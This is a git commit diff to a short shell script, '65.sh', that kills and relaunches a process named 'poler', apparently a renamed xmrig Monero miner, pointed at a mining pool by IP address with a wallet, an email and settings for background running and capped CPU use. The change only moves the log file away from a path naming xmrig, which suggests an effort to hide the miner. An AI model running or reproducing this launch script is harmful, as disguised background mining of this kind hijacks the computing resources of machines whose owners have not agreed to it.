f3f55c94ef333807c30b8b50d88e08dbf1c3dfbb
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-03-18 13:55:36 +0200

    Update 65.sh

--- 65.sh
+++ 65.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -o 95.216.219.10:5745 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 -l /tmp/miner/xmrig.log --pass=12:boraportnowsky@gmail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=44 --av=1 --variant -1
+poler -o 95.216.219.10:5745 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 -l /tmp/poler/poler.log --pass=12:boraportnowsky@gmail.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=44 --av=1 --variant -1
